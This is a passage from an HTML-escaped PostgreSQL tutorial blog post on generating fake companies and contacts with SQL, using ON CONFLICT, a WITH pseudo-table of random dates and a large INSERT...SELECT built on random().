&lt;p&gt;The &lt;code&gt;ON CONFLICT&lt;/code&gt; part is ot available before PostgreSQL 9.5, it can be used to
ignore the unique key errors. On an older PostgreSQL you'll have to generate
a select without key errors (using disticnt for example), here with this
&lt;code&gt;DO NOTHING&lt;/code&gt; I won't have any duplicate problem, they'll get rejected silently.&lt;/p&gt;

&lt;p&gt;On our starting schema we add &lt;a href=&quot;http://sqlfiddle.com/#!17/ec332/1&quot;&gt;in SQL Fiddle the generation of some companies&lt;/a&gt;
and we can see that we effectively loose one third of the companies as they were duplicates and were not inserted in the database.&lt;/p&gt;

&lt;h2&gt;More complex, again&lt;/h2&gt;

&lt;p&gt;We have companies.&lt;/p&gt;

&lt;p&gt;Now we'll try to get a &lt;code&gt;SELECT&lt;/code&gt; query with all the necessary columns for a contact insertion.&lt;/p&gt;

&lt;p&gt;Using the same template as the company names we can quite easily generate last and first names. &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/generating_names1.sql&quot;&gt;HERE, for example, I generate names&lt;/a&gt;&lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/188&quot;&gt;SQLFiddle&lt;/a&gt;. Note that if I remove the &lt;code&gt;+ (generator*0)&lt;/code&gt;, &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/189&quot;&gt;we generate the same name for each line&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We can generate some fake company identifiers (a random int between 1 and 6300 for example)
and find back this company to use the comapny name on the email address.
Email that need to be complete the last and first name (without accents).&lt;/p&gt;

&lt;p&gt;I can choose randomly a status on the contact status &lt;code&gt;ENUM&lt;/code&gt; choices.&lt;/p&gt;

&lt;p&gt;But we'll also need dates, Creation datetime, update datetime, and some interaction dates with these contacts.&lt;/p&gt;

&lt;p&gt;For this task I will start by building a pseudo table with dates. I want to be able, for on contact, to choose one date in this tables and use it as a creation date. I will then have some other dates columns in this same table, where the dates are after the first one (some weeks after for a first date, and some more time for a second one).&lt;/p&gt;

&lt;p&gt;By choosing randomly in this pseudo table I will be able to generate some profiles of contact creation dates and actions dates made on the contact.&lt;/p&gt;

&lt;p&gt;I will use &lt;code&gt;UNION&lt;/code&gt; queries in the dates collection to get different spannings, I want
a big number of dates on the last year, some others on the last 5 yers, and less on the last 10 years.
And of course i need these dates in a random order, but with an increment that I can use to match these dates as if it were an identifier.&lt;/p&gt;

&lt;p&gt;THe source code of this sub group of 1083 lines each giving 3 dates &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/generate_date_set.sql&quot;&gt;is here&lt;/a&gt; and we can &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/193&quot;&gt;see it in action with SQLFidlle&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; rownum |           base_date           |       date_up_to_7_days       |      date_up_to_3_months
--------+-------------------------------+-------------------------------+-------------------------------
      1 | 2016-12-12 11:49:32.811583+01 | 2016-12-15 22:20:32.811583+01 | 2017-06-27 18:34:32.811583+02
      2 | 2017-02-24 06:21:32.811583+01 | 2017-03-01 07:36:32.811583+01 | 2017-06-27 18:34:32.811583+02
      3 | 2012-06-28 08:40:32.811583+02 | 2012-07-02 15:06:32.811583+02 | 2014-02-22 07:16:32.811583+01
      4 | 2007-12-05 17:55:32.811583+01 | 2007-12-10 17:35:32.811583+01 | 2008-07-19 06:27:32.811583+02
      5 | 2014-01-09 18:48:32.811583+01 | 2014-01-10 22:10:32.811583+01 | 2014-10-25 19:48:32.811583+02
      6 | 2007-08-23 01:56:32.811583+02 | 2007-08-28 17:25:32.811583+02 | 2007-12-20 02:12:32.811583+01
      7 | 2017-01-01 00:54:32.811583+01 | 2017-01-05 06:28:32.811583+01 | 2017-06-27 18:34:32.811583+02
      8 | 2014-05-16 11:14:32.811583+02 | 2014-05-16 21:10:32.811583+02 | 2016-03-24 09:57:32.811583+01
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This sort of data group can be used in my request like a table by using the keyword &lt;code&gt;WITH&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- here the big dates select ...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tbl1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This avoids creating a temporary table, this table will only be used in the current query.&lt;/p&gt;

&lt;p&gt;This query, with all the dynamic columns, all reusing a base &lt;code&gt;generate_serie&lt;/code&gt;, will be quite big.&lt;/p&gt;

&lt;p&gt;In a simplified version, where the big generators are replaced by [ ... comments blocs .. ] we'll get :&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whole&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1083&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pseudo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_firstname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_lastname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;date_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_date_first_interaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_date_last_interaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;date_alter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_first_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name_first&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con_first_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_last_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name_last&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con_last_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_mail&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;concat_ws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;@&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;co&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manipulations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;company&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- date_create&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_date&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;date_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_date_first_interaction&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date_up_to_7_days&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;date_1st_interact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_date_last_interaction&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date_up_to_3_months&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date_up_to_7_days&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;date_2nd_interact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- date_alter&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date_up_to_3_months&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date_up_to_7_days&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_date&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;date_alter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_status&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;con_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- company link&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- name_first&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- name_last&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_status&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- comp_id (used for joining company table, adding comp_name on email&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- base_date_num (used for joining dates1083 pseudo-table, and computing others dates from that&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_date_num&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- con_active, something like 10% of false (inactive)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- has_1st interaction something like 95%&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- has_2nd interaction something like 65%&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- let&amp;#39;s hide some non required fields sometimes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- hiding 5 % of last_names&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; 